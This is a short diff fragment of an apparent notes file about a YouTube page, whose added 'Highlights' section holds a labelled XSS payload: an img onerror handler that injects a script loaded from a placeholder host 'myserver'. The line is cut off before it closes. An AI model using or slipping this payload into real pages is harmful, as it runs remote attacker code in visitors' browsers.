@@ -14,3 +14,7 @@ Cover: https://www.youtube.com/img/desktop/yt_1200.png
 Site: YouTube
 ---
 ## Highlights
+XSS Payload:
+```
+<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s
+```
